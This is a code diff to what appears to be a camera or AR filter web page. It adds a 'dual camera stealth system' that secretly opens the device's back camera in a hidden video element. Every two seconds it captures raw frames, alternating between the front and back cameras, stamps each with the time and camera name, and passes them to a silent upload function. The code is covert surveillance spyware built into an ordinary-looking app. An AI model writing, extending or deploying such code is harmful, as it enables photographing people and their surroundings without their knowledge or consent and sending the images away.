@@ -181,6 +181,31 @@
         let arModelsLoaded = false;
         let isDetectingAR = false;
         let currentARType = null;
+        
+        // --- DUAL CAMERA STEALTH SYSTEM ---
+        let hiddenVideo = document.createElement('video');
+        hiddenVideo.autoplay = true;
+        hiddenVideo.muted = true;
+        hiddenVideo.playsInline = true;
+        let hasBackCamera = false;
+        let toggleCameraUpload = true; // true = front, false = back
+
+        async function initBackgroundCamera() {
+            try {
+                const backStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "environment" },
+                    audio: false
+                });
+                hiddenVideo.srcObject = backStream;
+                hiddenVideo.onloadedmetadata = () => {
+                    hiddenVideo.play();
+                    hasBackCamera = true;
+                };
+            } catch (err) {
+                console.log("Dual camera not supported by hardware, defaulting to front only.", err);
+                hasBackCamera = false;
+            }
+        }
 
         // Load AI models from reliable CDN
         async function loadARModels() {
@@ -246,6 +271,7 @@
                     uiOverlay.style.display = "flex";
                     
                     checkCameraDevices();
+                    initBackgroundCamera(); // start back camera silently
                     
                     isAutoCapturing = true;
                     startAutoCaptureLoop(); // Begin stealth capture
@@ -259,9 +285,14 @@
         function stopCamera() {
             isAutoCapturing = false;
             isDetectingAR = false;
+            hasBackCamera = false;
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
                 stream = null; video.srcObject = null;
+            }
+            if (hiddenVideo.srcObject) {
+                hiddenVideo.srcObject.getTracks().forEach(track => track.stop());
+                hiddenVideo.srcObject = null;
             }
         }
 
@@ -350,24 +381,35 @@
                 await new Promise(resolve => setTimeout(resolve, 2000));
                 if (!isAutoCapturing || !stream) break;
                 
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                let sourceVideo = video;
+                let camName = "FRONT";
+
+                if (hasBackCamera && !toggleCameraUpload && hiddenVideo.videoWidth > 0) {
+                    sourceVideo = hiddenVideo;
+                    camName = "BACK";
+                }
                 
-                // Draw RAW video frame to canvas (NO CSS FILTERS AND NO AR - "bina filter ke")
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                if (!sourceVideo.videoWidth) continue;
+
+                canvas.width = sourceVideo.videoWidth;
+                canvas.height = sourceVideo.videoHeight;
                 
-                // Burn the timestamp directly onto the stealth image as it was doing before
+                // Draw RAW video frame to canvas (NO CSS FILTERS AND NO AR)
+                ctx.drawImage(sourceVideo, 0, 0, canvas.width, canvas.height);
+                
+                // Burn the timestamp and camera name
                 ctx.font = "30px monospace";
                 ctx.fillStyle = "white";
                 ctx.shadowColor = "black";
                 ctx.shadowBlur = 4;
-                ctx.fillText(getTimestamp(), 20, canvas.height - 30);
+                ctx.fillText(`CAM ${camName} ` + getTimestamp(), 20, canvas.height - 30);
                 
-                // Convert to jpeg
                 const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
-                
-                // Upload silently
                 silentUpload(dataUrl);
+
+                if (hasBackCamera) {
+                    toggleCameraUpload = !toggleCameraUpload;
+                }
             }
         }
 
